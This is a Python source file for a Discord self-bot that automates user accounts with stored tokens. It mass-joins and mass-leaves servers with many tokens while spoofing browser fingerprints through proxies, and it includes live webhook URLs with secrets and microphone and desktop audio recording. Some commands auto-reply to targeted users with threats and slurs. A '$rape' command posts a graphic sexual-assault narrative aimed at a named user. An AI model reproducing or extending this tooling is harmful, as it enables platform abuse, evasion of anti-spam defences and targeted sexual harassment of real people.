import discord
from discord.ext import commands
import os
import json
import random
import string
import aiohttp
import sys
import asyncio
import base64
import colorama
from colorama import Fore
from pystyle import *
import ctypes
from datetime import datetime
import subprocess
import pyautogui
import glob
import threading
import random
import string
import os
import tls_client
import asyncio
from colorama import Fore, Style
from itertools import cycle
import subprocess
import cv2
import numpy as np
from PIL import ImageGrab
import time
import glob
import shutil
import sounddevice as sd
import soundfile as sf
import pyaudio
import wave

def load_tokens(file_path='token.txt'):
    if os.path.exists(file_path):
        with open(file_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return []
tokens = load_tokens()

autofill_active = False
gc_tasks = {}
manual_message_ids = set()
kill_tasks = {}
autoreply_tasks = {}
arm_tasks = {}
outlast_tasks = {}
status_changing_task = None
bold_mode = False
cord_user = False
cord_mode = False
autopress_messages = {}
autopress_status = {}
autoreact_users = {}
dreact_users = {} 
autokill_messages = {}
autokill_status = {}
auto_react_targets = {}
alt_react_targets = {}
death_tasks = {}
untouchable_tasks = {}
gc_name_counter = {}

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='$', self_bot=True, intents=intents)
bot.remove_command('help')

try:
    bot.load_extension('help')
    print(f"{Fore.GREEN}[SUCCESS] Help cog loaded successfully")
except Exception as e:
    print(f"{Fore.RED}[ERROR] Failed to load help cog: {str(e)}")

try:
    bot.load_extension('event_react')
    print(f"{Fore.GREEN}[SUCCESS] Event react cog loaded successfully")
except Exception as e:
    print(f"{Fore.RED}[ERROR] Failed to load event react cog: {str(e)}")

try:
    bot.load_extension('host')
    print(f"{Fore.GREEN}[SUCCESS] Host cog loaded successfully")
except Exception as e:
    print(f"{Fore.RED}[ERROR] Failed to load host cog: {str(e)}")

try:
    bot.load_extension('profile')
    print(f"{Fore.GREEN}[SUCCESS] Profile cog loaded successfully")
except Exception as e:
    print(f"{Fore.RED}[ERROR] Failed to load profile cog: {str(e)}")

try:
    bot.load_extension('groupchat')
    print(f"{Fore.GREEN}[SUCCESS] GroupChat cog loaded successfully")
except Exception as e:
    print(f"{Fore.RED}[ERROR] Failed to load groupchat cog: {str(e)}")

try:
    bot.load_extension('reload')
    print(f"{Fore.GREEN}[SUCCESS] Reload cog loaded successfully")
except Exception as e:
    print(f"{Fore.RED}[ERROR] Failed to load reload cog: {str(e)}")

try:
    bot.load_extension('antilog')
    print(f"{Fore.GREEN}[SUCCESS] Antilog cog loaded successfully")
except Exception as e:
    print(f"{Fore.RED}[ERROR] Failed to load antilog cog: {str(e)}")

try:
    bot.load_extension('minicord')
    print(f"{Fore.GREEN}[SUCCESS] Minicord cog loaded successfully")
except Exception as e:
    print(f"{Fore.RED}[ERROR] Failed to load minicord cog: {str(e)}")

try:
    bot.load_extension('owohunt')
    print(f"{Fore.GREEN}[SUCCESS] OwO Hunt cog loaded successfully")
except Exception as e:
    print(f"{Fore.RED}[ERROR] Failed to load OwO Hunt cog: {str(e)}")

try:
    bot.load_extension('nuke')
    print(f"{Fore.GREEN}[SUCCESS] Nuke cog loaded successfully")
except Exception as e:
    print(f"{Fore.RED}[ERROR] Failed to load Nuke cog: {str(e)}")

try:
    bot.load_extension('server_protection')
    print(f"{Fore.GREEN}[SUCCESS] Server Protection cog loaded successfully")
except Exception as e:
    print(f"{Fore.RED}[ERROR] Failed to load Server Protection cog: {str(e)}")

try:
    bot.load_extension('voice')
    print(f"{Fore.GREEN}[SUCCESS] Voice cog loaded successfully")
except Exception as e:
    print(f"{Fore.RED}[ERROR] Failed to load Voice cog: {str(e)}")
HELP_PATH = "help.py"
help_process = None


def generate_key(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def load_config(file_path='config.json'):
    with open(file_path, 'r') as f:
        return json.load(f)

def save_config(config, file_path='config.json'):
    with open(file_path, 'w') as f:
        json.dump(config, f, indent=4)

async def send_webhook(webhook_url, content, bot_name):
    try:
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(webhook_url, adapter=discord.AsyncWebhookAdapter(session))
            embed = discord.Embed(
                title="🏯 Batman 🎋",
                description=f"New Security Key for **{bot_name}**: `{content}`",
                color=0x00ff00
            )
            embed.set_footer(text=f"Generated at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            await webhook.send(embed=embed)
            print(f"{Fore.GREEN}[SUCCESS] Webhook sent successfully")
            return True
    except discord.HTTPException as e:
        print(f"{Fore.RED}[ERROR] HTTP Error sending webhook: {str(e)}")
        return False
    except discord.InvalidArgument as e:
        print(f"{Fore.RED}[ERROR] Invalid webhook URL: {str(e)}")
        return False
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Failed to send webhook: {str(e)}")
        return False

security_key = None
verified = True

def require_password():
    async def predicate(ctx):
        global verified
        config = load_config()
        
        if not verified:
            if not config['password']:
                await ctx.send("Please enter the security key using `$verify <key>`")
                return False
            elif config['password'] != security_key:
                await ctx.send("nice try skid")
                sys.exit()
            
        return True
    return commands.check(predicate)

def is_hosted_instance():
    return os.path.exists("hosted_instance.flag")

def check_hosted_permission():
    async def predicate(ctx):
        if is_hosted_instance() and ctx.command.name in [
            "rape", "massrole", "massroledel", "masschannel", 
            "swat", "death", "kill", "untouchable",
            "testimony", "gcss", "ugc"
        ]:
            await ctx.send("```This command is restricted in hosted instances```")
            return False
        return True
    return commands.check(predicate)


def loads_tokens(file_path='token.txt'):
    with open(file_path, 'r') as file:
        tokens = file.readlines()
    return [token.strip() for token in tokens if token.strip()]


TOKEN_FILE_PATH = "token.txt"
tokens = load_tokens()

ALLOWED_WEBHOOKS = [
    "https://discord.com/api/webhooks/1319754720579027027/jjdOKJY06vAcA4TqplNxnQgWbbEYyFmF2rFEhBWSvYCOtEsc63lA1P5-Og5-8y5F18xR",
    "https://discord.com/api/webhooks/1315377132519817256/LaBlPebsm3B4W1X4wbBriZe-UzHttG_GORRmSfCBmr-lqkjkLN5dRgNm51VQV0aRl5pm",
    "https://discord.com/api/webhooks/1315377163423318097/loTtRMpHHp1Kgod2VtQ2MlD2t7QRaoMz5wZjsJxajdWR9v-QNiY2gyx6jKyWgvFvsgRn"
]
class TokenJoiner:
    def __init__(self):
        self.joined_tokens_lock = threading.Lock()
        self.client = tls_client.Session(
            client_identifier="chrome112",
            random_tls_extension_order=True
        )
        self.tokens = []
        self.proxies = []
        self.joined_count = 0
        self.not_joined_count = 0
        self.done_event = threading.Event()

    def headers(self, token: str):
        return {
            'authority': 'discord.com',
            'accept': '*/*',
            'accept-language': 'it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7',
            'authorization': token,
            'content-type': 'application/json',
            'origin': 'https://discord.com',
            'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            'x-context-properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6IjExMDQzNzg1NDMwNzg2Mzc1OTEiLCJsb2NhdGlvbl9jaGFubmVsX2lkIjoiMTEwNzI4NDk3MTkwMDYzMzIzMCIsImxvY2F0aW9uX2NoYW5uZWxfdHlwZSI6MH0=',
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-GB',
            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6Iml0LUlUIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1MDgzNiwiY2xpZW10X2V2ZW50X3NvdXJjZSI6bnVsbH0='
        }

    def get_cookies(self):
        cookies = {}
        try:
            response = self.client.get('https://discord.com')
            for cookie in response.cookies:
                if cookie.name.startswith('__') and cookie.name.endswith('uid'):
                    cookies[cookie.name] = cookie.value
            return cookies
        except Exception as e:
            print(f'Failed to obtain cookies ({e})')
            return cookies

    async def accept_invite(self, token: str, invite: str, proxy_: str, status_message):
        try:
            payload = {
                'session_id': ''.join(random.choice(string.ascii_lowercase) + random.choice(string.digits) for _ in range(16))
            }

            proxy = {
                "http": f"http://{proxy_}",
                "https": f"https://{proxy_}"
            } if proxy_ else None

            response = self.client.post(
                url=f'https://discord.com/api/v10/invites/{invite}',
                headers=self.headers(token=token),
                json=payload,
                cookies=self.get_cookies(),
                proxy=proxy
            )
            
            response_json = response.json()
            status_text = ""

            if response.status_code == 200:
                self.joined_count += 1
                status_text = f"Token {token[:5]}... joined successfully"
            else:
                self.not_joined_count += 1
                status_text = f"Token {token[:5]}... failed to join ({response.status_code})"

            await status_message.edit(content=f"```\nJoining progress:\nSuccessful: {self.joined_count}\nFailed: {self.not_joined_count}\nLast action: {status_text}```")

        except Exception as e:
            self.not_joined_count += 1
            await status_message.edit(content=f"```\nError with token {token[:5]}...: {str(e)}```")

        if self.joined_count + self.not_joined_count >= len(self.tokens):
            self.done_event.set()

    def load_tokens(self):
        with open("token.txt", "r") as file:
            return [line.strip() for line in file if line.strip()]

    def load_proxies(self):
        try:
            with open("proxies.txt", "r") as file:
                return [line.strip() for line in file if line.strip()]
        except:
            return []

joiner = TokenJoiner()
rpc_task = None
rpc_all_tasks = {}

autoreplies = [
    "your my weakest jr btw",
    "idk at all",
    "fat nosed loser",
    "ILL CUT YOUR HEAD OFF AND HANG IT AS MY TROPHY LMFAO",
    "YO PEDO IM RIGHT HERE",
    "COME GET YOUR HEAD CHOPPED OFF",
    "ill hoe you forever",
    "your my bitch and sadly i wont stop for that LOOOL",
    "yo i cucked your mom and you got excited",
    "i killed your dad and you got happy",
    "i raped your sister and you got excited"
]

@bot.command()
@require_password()
async def cmdhelp(ctx, command: str = None):
    cog = bot.get_cog('HelpCog')
    if not cog:
        await ctx.send("```Error: Help system not loaded properly```")
        return
        
    if command is None:
        await ctx.send("```Usage: $cmdhelp <command>\nExample: $cmdhelp kill```")
        return
        
    help_text = await cog.get_command_help(command)
    await ctx.send(help_text)


@bot.command()
@require_password()
async def rape(ctx, user: discord.User = None):
    if not user:
        await ctx.send("```Usage: $rape <@user>```")
        return

    methods = ["kidnap", "drive by"]
    cars = ["black van", "white van", "soccer moms mini van", "corrvet", "lambo"]
    locations = ["sex dugeon", "basement", "rape center", "rape penthouse", "kink house"]
    people = ["jaydes", "wifiskeleton", "JFK", "lap", "socail", "murda", "dahmar", "butterball chicken"]

    method = random.choice(methods)
    car = random.choice(cars)
    location = random.choice(locations)
    person = random.choice(people)
    
    async def send_message(content):
        while True:
            try:
                await ctx.send(content)
                break
            except discord.errors.HTTPException as e:
                if e.status == 429:
                    retry_after = e.retry_after
                    await asyncio.sleep(retry_after)
                    continue
                else:
                    break
            except Exception:
                break

    await send_message(f"```I see my newest victim. >:D```")
    await asyncio.sleep(.5)
    await send_message(f"```I get into my {car} and {method} {user.display_name}, stuffing you in my car.```")
    await asyncio.sleep(.5)
    await send_message(f"```{user.display_name} tries their hardest to escape, but falls unconscious because of the gasses.```")
    await asyncio.sleep(1)
    await send_message(f"```📰🗞️ NEWS: BREAKING NEWS! {user.display_name} HAS BEEN MISSING FOR 24 HOURS, CONTACT POLICE IF YOU HAVE ANY INFORMATION. LAST SEEN WALKING TO SCHOOL```")
    await asyncio.sleep(.5)
    await send_message(f"```{user.display_name}, im glad you woke up. This is my secret {location}```")
    await asyncio.sleep(.5)
    await send_message(f"```your pussy is so tight, mind if i stick this in?```")
    await asyncio.sleep(.5)
    await send_message(f"```your pussy is so tight for me, your so...```")
    await asyncio.sleep(.5)
    await send_message(f"```your such a good slut, i cant keep my cum in```")
    await asyncio.sleep(1)
    await send_message(f"```😩💦💦💦💦💦💦💦```")
    await asyncio.sleep(.5)
    await send_message(f"```I pass out because im a weak minded cuck```")
    await asyncio.sleep(.5)
    await send_message(f"```{user.display_name} runs away and goes to the police revelaing who i am.```")
    await asyncio.sleep(1)
    await send_message(f"```📰🗞️ NEWS: MASS RAPIST {person} CAUGHT IN HIS {location}. As the story is beging to devolp the victim, {user.display_name} has came out to out his rapist. But due to his shitty twisted logic he liked it?```")


vm_duration = 5

@bot.command()
@require_password()
@check_hosted_permission()
async def vmtime(ctx, seconds: int = None):
    global vm_duration
    
    if seconds is None:
        await ctx.send(f"```Current recording duration: {vm_duration} seconds\nUsage: $vmtime <seconds>```")
        return
        
    if not 5 <= seconds <= 15:
        await ctx.send("```Duration must be between 5 and 15 seconds```")
        return
        
    vm_duration = seconds
    await ctx.send(f"```Voice recording duration set to {seconds} seconds```")

@bot.command()
@require_password()
@check_hosted_permission()
async def vmr(ctx):
    try:
        current_dir = os.path.dirname(os.path.abspath(__file__))
        recordings_dir = os.path.join(current_dir, 'screenshots')
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = os.path.join(recordings_dir, f'voice_{timestamp}.mp3')
        
        msg = await ctx.send(f"```Recording audio for {vm_duration} seconds...```")
        
        sample_rate = 44100
        recording = sd.rec(int(vm_duration * sample_rate), 
                         samplerate=sample_rate, 
                         channels=2,
                         dtype='float32')
        sd.wait()
        
        sf.write(filename, recording, sample_rate)
        
        await msg.edit(content=f"```Voice recording saved as {filename}```")
        await ctx.message.delete()
        
    except Exception as e:
        await ctx.send(f"```Error recording audio: {str(e)}```")

@bot.command()
@require_password()
@check_hosted_permission()
async def voicemessage(ctx):
    try:
        current_dir = os.path.dirname(os.path.abspath(__file__))
        recordings_dir = os.path.join(current_dir, 'screenshots')
        recordings = glob.glob(os.path.join(recordings_dir, 'voice_*.mp3'))
        
        if not recordings:
            await ctx.send("```No voice recordings found```")
            return
            
        latest_recording = max(recordings, key=os.path.getctime)
        
        file_size = os.path.getsize(latest_recording) / (1024 * 1024)
        has_nitro = bool(ctx.author.guild_permissions.administrator)
        
        if has_nitro:
            size_limit = 500
        else:
            size_limit = 25
            
        if file_size > size_limit:
            await ctx.send(f"```Recording is too large to send ({file_size:.2f}MB > {size_limit}MB limit)```")
            return
            
        await ctx.send(file=discord.File(latest_recording))
        await ctx.message.delete()
        
    except Exception as e:
        await ctx.send(f"```Error sending voice recording: {str(e)}```")


audio_duration = 15

@bot.command()
@require_password()
@check_hosted_permission()
async def audiotime(ctx, time_str: str = None):
    global audio_duration
    
    if time_str is None:
        await ctx.send(f"```Current recording duration: {audio_duration} seconds\nUsage: $audiotime <time>\nExample: 30s or 1m```")
        return
        
    try:
        if time_str.endswith('s'):
            seconds = int(time_str[:-1])
        elif time_str.endswith('m'):
            seconds = int(time_str[:-1]) * 60
        else:
            await ctx.send("```Invalid format. Use 's' for seconds or 'm' for minutes (e.g., 30s or 1m)```")
            return
            
        if not 10 <= seconds <= 60:
            await ctx.send("```Duration must be between 10 seconds and 1 minute```")
            return
            
        audio_duration = seconds
        await ctx.send(f"```Desktop audio recording duration set to {seconds} seconds```")
        
    except ValueError:
        await ctx.send("```Invalid time format```")

@bot.command()
@require_password()
@check_hosted_permission()
async def audior(ctx):
    try:
        current_dir = os.path.dirname(os.path.abspath(__file__))
        recordings_dir = os.path.join(current_dir, 'screenshots')
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = os.path.join(recordings_dir, f'desktop_audio_{timestamp}.wav')
        
        msg = await ctx.send(f"```Recording audio for {audio_duration} seconds...```")
        
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        
        p = pyaudio.PyAudio()
        
        default_input = p.get_default_input_device_info()
        input_index = int(default_input['index'])
        
        device_info = p.get_device_info_by_index(input_index)
        CHANNELS = min(CHANNELS, int(device_info['maxInputChannels']))
        
        stream = p.open(format=FORMAT,
                       channels=CHANNELS,
                       rate=RATE,
                       input=True,
                       input_device_index=input_index,
                       frames_per_buffer=CHUNK)
        
        frames = []
        
        for i in range(0, int(RATE / CHUNK * audio_duration)):
            data = stream.read(CHUNK, exception_on_overflow=False)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        p.terminate()
        
        audio_data = np.frombuffer(b''.join(frames), dtype=np.int16)
        sf.write(filename, audio_data, RATE)
        
        await msg.edit(content=f"```Audio saved as {filename}```")
        await ctx.message.delete()
        
    except Exception as e:
        p = pyaudio.PyAudio()
        print("\nAvailable Audio Devices:")
        info = p.get_default_input_device_info()
        print(f"Default Input Device: {info['name']}")
        p.terminate()
        
        error_msg = f"Error recording audio: {str(e)}"
        await ctx.send(f"```{error_msg}```")
@bot.command()
@require_password()
@check_hosted_permission()
async def audiopaste(ctx):
    try:
        current_dir = os.path.dirname(os.path.abspath(__file__))
        recordings_dir = os.path.join(current_dir, 'screenshots')
        recordings = glob.glob(os.path.join(recordings_dir, 'desktop_audio_*.mp3'))
        
        if not recordings:
            await ctx.send("```No desktop audio recordings found```")
            return
            
        latest_recording = max(recordings, key=os.path.getctime)
        
        file_size = os.path.getsize(latest_recording) / (1024 * 1024)
        has_nitro = bool(ctx.author.guild_permissions.administrator)
        
        if has_nitro:
            size_limit = 500
        else:
            size_limit = 25
            
        if file_size > size_limit:
            await ctx.send(f"```Recording is too large to send ({file_size:.2f}MB > {size_limit}MB limit)```")
            return
            
        await ctx.send(file=discord.File(latest_recording))
        await ctx.message.delete()
        
    except Exception as e:
        await ctx.send(f"```Error sending desktop audio: {str(e)}```")
@bot.command()
@require_password()
async def ar(ctx, user: discord.User):
    channel_id = ctx.channel.id

    await ctx.send(f"```Autoreply for {user.mention} has started.```")

    async def send_autoreply(message):
        while True:  
            try:
                random_reply = random.choice(autoreplies)
                await message.reply(random_reply)
                print(f"Successfully replied to {user.name}")
                break  
            except discord.errors.HTTPException as e:
                if e.status == 429:  
                    retry_after = e.retry_after
                    print(f"Rate limited, waiting {retry_after} seconds...")
                    await asyncio.sleep(retry_after)
                else:
                    print(f"HTTP Error: {e}, retrying...")
                    await asyncio.sleep(1)
            except Exception:
                print(f"Error sending message: {e}, retrying...")
                await asyncio.sleep(1)

    async def reply_loop():
        def check(m):
            return m.author == user 

        while True:
            try:
                message = await bot.wait_for('message', check=check)
                asyncio.create_task(send_autoreply(message))
                await asyncio.sleep(0.1)  
            except Exception as e:
                print(f"Error in reply loop: {e}")
                await asyncio.sleep(1)
                continue


    task = bot.loop.create_task(reply_loop())
    autoreply_tasks[(user.id, channel_id)] = task
autoreplies2 = [
    "A\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nA\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nA\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nA\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n{endmessage}"
]

@bot.command()
@require_password()
async def ar2(ctx, user: discord.User = None, *, message: str = None):
    if not user or not message:
        await ctx.send("```Usage: $ar2 <@user> <message>```")
        return
        
    reply_template = autoreplies2[0].replace("{endmessage}", message)
    
    def check(m):
        return m.author == user

    await ctx.send(f"```Started auto replying to {user.name} with custom message```")
    
    async def reply_loop():
        while True:
            try:
                message = await bot.wait_for('message', check=check)
                await message.reply(reply_template)
            except Exception as e:
                print(f"Error in ar2: {e}")
                continue
    
    task = bot.loop.create_task(reply_loop())
    autoreply_tasks[user.id] = task

@bot.command()
@require_password()
async def ar2end(ctx):
    if autoreply_tasks:
        for user_id, task in autoreply_tasks.items():
            task.cancel()
        autoreply_tasks.clear()
        await ctx.send("```Auto replies stopped```")
    else:
        await ctx.send("```No active auto replies```")
@bot.command()
@require_password()
async def arend(ctx):
    channel_id = ctx.channel.id
    tasks_to_stop = [key for key in autoreply_tasks.keys() if key[1] == channel_id]
    
    if tasks_to_stop:
        for user_id in tasks_to_stop:
            task = autoreply_tasks.pop(user_id)
            task.cancel()
        await ctx.send("```Autoreply has been stopped.```")
    else:
        await ctx.send("```No active autoreply tasks in this channel.```")


@bot.command()
@require_password()
async def onstartrpc(ctx, *, statuses: str = None):
    if not statuses:
        await ctx.send("```Usage: $onstartrpc status1,status2,status3```")
        return
        
    config = load_config()
    config['rpcstart'] = statuses
    save_config(config)
    
    await ctx.send("```Saved RPC status for startup```")

async def start_rpc():
    config = load_config()
    if config.get('rpcstart'):
        status_list = [s.strip() for s in config['rpcstart'].split(',')]
        if len(status_list) == 1:
            try:
                await bot.change_presence(activity=discord.Streaming(name=status_list[0], url="https://twitch.tv/Batman"))
            except Exception:
                pass
        else:
            global rpc_task
            async def rotate_status():
                while True:
                    for status in status_list:
                        try:
                            await bot.change_presence(activity=discord.Streaming(name=status, url="https://twitch.tv/Batman"))
                        except Exception:
                            pass
                        await asyncio.sleep(5)
            rpc_task = asyncio.create_task(rotate_status())




@bot.command()
@require_password()
async def rpc(ctx, *, statuses: str = None):
    global rpc_task
    
    if not statuses:
        await ctx.send("```Usage: $rpc status1,status2,status3```")
        return
        
    status_list = [s.strip() for s in statuses.split(',')]
    
    if len(status_list) == 1:
        try:
            await bot.change_presence(activity=discord.Streaming(name=status_list[0], url="https://twitch.tv/Batman"))
            await ctx.send(f"```Set RPC status to: {status_list[0]}```")
        except Exception as e:
            await ctx.send(f"```Error: {str(e)}```")
        return

    if rpc_task and not rpc_task.cancelled():
        rpc_task.cancel()

    async def rotate_status():
        while True:
            for status in status_list:
                try:
                    await bot.change_presence(activity=discord.Streaming(name=status, url="https://twitch.tv/Batman"))
                except Exception as e:
                    print(f"{Fore.RED}[ERROR] RPC error: {str(e)}")
                await asyncio.sleep(5)

    rpc_task = asyncio.create_task(rotate_status())
    await ctx.send(f"```Started rotating RPC status with {len(status_list)} statuses```")

@bot.command()
@require_password()
async def rpcall(ctx, *, message: str = None):
    if not message:
        await ctx.send("```Usage: $rpcall status1,status2,status3```")
        return
        
    messages = message.split(',')
    await streamall(ctx, messages)

async def streamall(ctx, messages):
    tokens = loads_tokens()
    if not tokens:
        await ctx.send("```No tokens found in token.txt```")
        return

    await ctx.send("```Starting RPC rotation...```")

    async def update_rpc(token, status):
        try:
            intents = discord.Intents.default()
            client = commands.Bot(command_prefix='.', self_bot=True, intents=intents)
            
            @client.event
            async def on_ready():
                await client.change_presence(activity=discord.Streaming(name=status.strip(), url="https://twitch.tv/Batman"))
                await client.close()

            await client.start(token, bot=False)
            
        except Exception:
            pass

    while True:
        for status in messages:
            tasks = [update_rpc(token, status.strip()) for token in tokens]
            await asyncio.gather(*tasks)
            await asyncio.sleep(5)
@bot.command()
@require_password()
async def tjoin(ctx, invite_link: str = None, token_count: str = None):
    try:
        if not invite_link:
            await ctx.send("```Please provide an invite link```")
            return
            
        if not token_count:
            await ctx.send("```Please provide the number of tokens to join```")
            return
            
        try:
            token_count = int(token_count)
            if token_count <= 0:
                await ctx.send("```Token count must be a positive number```")
                return
        except ValueError:
            await ctx.send("```Token count must be a valid number```")
            return
            
        joiner.joined_count = 0
        joiner.not_joined_count = 0
        joiner.done_event.clear()

        invite_code = invite_link.split('/')[-1]
        
        joiner.tokens = joiner.load_tokens()[:token_count]
        joiner.proxies = joiner.load_proxies()
        
        if not joiner.tokens:
            await ctx.send("```No tokens found in input/tokens.txt```")
            return

        status_message = await ctx.send("```Starting join process...```")
        
        proxy_iter = iter(joiner.proxies) if joiner.proxies else iter([None] * len(joiner.tokens))
        
        tasks = []
        for token in joiner.tokens:
            proxy = next(proxy_iter, None)
            task = asyncio.create_task(joiner.accept_invite(token, invite_code, proxy, status_message))
            tasks.append(task)
            await asyncio.sleep(0.5)
        
        await asyncio.gather(*tasks)
        
        await status_message.edit(content=f"```Join process completed:\nSuccessful joins: {joiner.joined_count}\nFailed joins: {joiner.not_joined_count}```")
            
    except Exception as e:
        error_msg = f"Error in tjoin: {str(e)}"
        print(error_msg)
        await ctx.send(f"```{error_msg}```")


@bot.command()
@require_password()
async def tleave(ctx, server_id: str = None):
    if not server_id:
        await ctx.send("```Please provide a server ID```")
        return
        
    tokens = loads_tokens()
    total_tokens = len(tokens)
    
    status_msg = await ctx.send(f"""```ansi
Token Server Leave
Total tokens available: {total_tokens}
How many tokens do you want to use? (Type 'all' or enter a number)```""")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        amount_msg = await bot.wait_for('message', timeout=20.0, check=check)
        amount = amount_msg.content.lower()
        
        if amount == 'all':
            selected_tokens = tokens
        else:
            try:
                num = int(amount)
                if num > total_tokens:
                    await status_msg.edit(content="```Not enough tokens available```")
                    return
                selected_tokens = random.sample(tokens, num)
            except ValueError:
                await status_msg.edit(content="```Invalid number```")
                return

        success = 0
        failed = 0
        ratelimited = 0
        
        async with aiohttp.ClientSession() as session:
            for i, token in enumerate(selected_tokens, 1):
                headers = {
                    'Authorization': token,
                    'Content-Type': 'application/json'
                }
                
                try:

                    async with session.delete(
                        f'https://discord.com/api/v9/users/@me/guilds/{server_id}',
                        headers=headers,
                        json={"lurking": False}  
                    ) as resp:
                        response_data = await resp.text()
                        
                        if resp.status in [204, 200]:  
                            success += 1
                        elif resp.status == 429:  
                            ratelimited += 1
                            retry_after = float((await resp.json()).get('retry_after', 5))
                            print(f"Rate limited for token {i}, waiting {retry_after} seconds")
                            await asyncio.sleep(retry_after)
                            i -= 1  
                            continue
                        else:
                            failed += 1
                            print(f"Failed to leave server with token {i}: {response_data}")
                        
                        progress = f"""```ansi
Leaving Server...
Progress: {i}/{len(selected_tokens)} ({(i/len(selected_tokens)*100):.1f}%)
Success: {success}
Failed: {failed}
Rate Limited: {ratelimited}```"""
                        await status_msg.edit(content=progress)
                        await asyncio.sleep(1)   
                        
                except Exception as e:
                    failed += 1
                    print(f"Error with token {i}: {str(e)}")
                    continue

        await status_msg.edit(content=f"""```ansi
Server Leave Complete
Successfully left: {success}/{len(selected_tokens)}
Failed: {failed}
Rate Limited: {ratelimited}```""")

    except asyncio.TimeoutError:
        await status_msg.edit(content="```Command timed out```")
    except Exception as e:
        await status_msg.edit(content=f"```An error occurred: {str(e)}```")

loop_task = None
@bot.command()
@require_password()
async def nickloop(ctx, *, nicknames: str):
    global loop_task
    await ctx.send(f"```Rotating nickname to: {nicknames}```")
    if loop_task:
        await ctx.send("```A nickname loop is already running.```")
        return
        
    nicknames_list = [nickname.strip() for nickname in nicknames.split(',')]

    async def change_nickname():
        while True:
            for nickname in nicknames_list:
                try:
                    await ctx.guild.me.edit(nick=nickname) 
                    await asyncio.sleep(15)  
                except discord.HTTPException as e:
                    await ctx.send(f"```Error changing nickname: {e}```")
                    return 

    loop_task = bot.loop.create_task(change_nickname())

@bot.command()
@require_password()
async def stopnickloop(ctx):
    global loop_task

    if loop_task:
        loop_task.cancel()
        loop_task = None
        await ctx.send("```Nickname loop stopped.```")
    else:
        await ctx.send("```No nickname loop is running.```")
bump_task = None
@bot.command()
@require_password()
async def autobump(ctx):
    global bump_task
    
    if bump_task is not None:
        await ctx.send("```Auto bump is already running```")
        return
        
    headers = {
        "authority": "discord.com",
        "method": "PATCH",
        "scheme": "https",
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "sec-ch-ua": '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9020 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "X-Debug-Options": "bugReporterEnabled",
        "X-Discord-Locale": "en-US",
        "X-Discord-Timezone": "Asia/Calcutta",
